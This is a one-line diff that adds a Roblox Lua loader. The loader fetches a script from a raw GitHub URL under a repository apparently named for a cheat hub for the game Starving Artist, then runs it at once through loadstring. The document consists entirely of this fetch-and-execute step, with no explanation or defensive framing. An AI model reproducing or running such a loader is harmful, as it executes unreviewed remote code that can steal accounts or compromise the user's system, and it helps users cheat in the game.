@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LRHUBEDIT/STARVINGARTIST/main/lua.txt"))()
